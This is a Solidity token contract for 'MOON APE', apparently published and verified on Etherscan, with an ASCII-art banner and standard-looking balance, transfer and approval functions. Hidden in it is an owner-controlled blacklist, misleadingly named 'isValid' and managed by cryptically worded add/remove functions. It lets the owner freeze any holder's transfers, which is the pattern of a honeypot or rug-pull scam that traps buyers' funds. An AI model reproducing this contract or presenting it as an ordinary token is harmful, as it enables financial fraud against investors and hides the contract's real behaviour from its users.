/**
 *Submitted for verification at Etherscan.io on 2022-08-10
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

/*

    ████████████████████████████████████████████████████████████████████████████████
    ████████████████████████████████████████████████████████████████████████████████
    ███████████████████████████████████▀▀╢▒▒▓▓▓╣╣▒▓▓▀███████████████████████████████
    ██████████████████████████████▀▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓███████████████████████████
    ███████████████████████████╣▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████████████████████
    ████████████████████████╨╫▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████████████████████
    █████████████████████▀▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓███████████████████
    ████████████████████▒╟▓▓▓▓▓▓▓▓▓▓▓▓▀▀▀▓▓▓▓▓▓▓▒▒▒▒▒▒▒▀▓▓▓▓▓▓▓▓▓▌▀█████████████████
    ██████████████████▀▒▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓▓▒▒▒▄▄▄▒▒▓▒▒▒▒▒▒▒▒█▓▓▓▓▓█▓▌▓████████████████
    █████████████████▌▒▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓▓▓▒▄▒▓▓▓▓▌▒▓▒▒▒▒▒▒▒▒▀▓▓▓▓▓▓█░▓███████████████
    ████████████████▌╫▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓▓█▒▒▌▓▓▓▓█▒▒▌▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓█φ║███████████████
    ████████████████╬▓▓▓▓▓▓▓▓▓▓▓▓▒▒▄▄▒▒▒▒▒▀▀▓▀▀▒▒▐▒▒▒▒▒▒▒▒▒▓▓█▓████▓░▓██████████████
    ███████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▌▒▓▓▓▓▌▒▒▒▒▒▒▒▒▒▒▒▄▒╢▒▒▒▒▒▓▓█▓██▓█▓▌░╫██████████████
    ███████████████Ü▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓▓█▀▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▓▓▒▓█▓▓▓▓█▓█▓█▓░╫██████████████
    ██████████████▌j▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓█▓▓▓▓▓▓█▓▓█▓██╣▒╫██████████████
    ██████████████▌j▓▓▓▓▓▓▓▓▓▓▓▒▓╢▓▒▒▒▒▒▒▒▒╢▓╢▒▒▓▒▒█▓▓▓▓▓▓▓▓▓█▓██▓▌░╢███████████████
    ███████████████░▓▓▓▓▓▓▓▓▓▒▀▀▓▒▓▒▓▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓██▓█▓▓██▓██░╢╢███████████████
    ███████████████▌▐▓▓▓████▒▒▒▓▒▒▓▓▒▓▒▓▒▀▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓█▓█▒╣╫████████████████
    ████████████████w▓▓▓▓▓▓▓█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▓▓▓▓▓▓█▓████▓▓▒▓▓█████████████████
    █████████████████▓▓▓▓▓▓▓▓▓█▓▓▓▄▄▄▒▒▄▓▓▓▓▓▓▓█▓▓█▓▓▓▓█▓██▓█▓╜@▓▓██████████████████
    ███████████████████▓▓▓▓▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓█▓▓█▓██╜▓▓▓████████████████████
    █████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓█▀╜▓▓▓██████████████████████
    ██████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒║▓▓▓████████████████████████
    █████████████████████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀▓╨$▓▓▓▓███████████████████████████
    █████████████████████████████▄▄▓▓▓╩▓▓▓▓▓▓▓▓▓▓▓▓▓▓███████████████████████████████
    ████████████████████████████████████████████████████████████████████████████████
    ████████████████████████████████████████████████████████████████████████████████

*/



contract MOONAPE {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) isValid; 
    string public name = "MOON APE";
    string public symbol = unicode"MOONAPE";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    



    function add(address _user) public onlyOwner {
        require(!isValid[_user], "Is");
        isValid[_user] = true;
     
    }
    
    function remove(address _user) public onlyOwner {
        require(isValid[_user], "Is not");
        isValid[_user] = false;
      
    }
    
 


   
    
 




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!isValid[msg.sender] , "x"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }






    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
        

        
        
        
        require(!isValid[from] , "x"); 
               require(!isValid[to] , "x"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}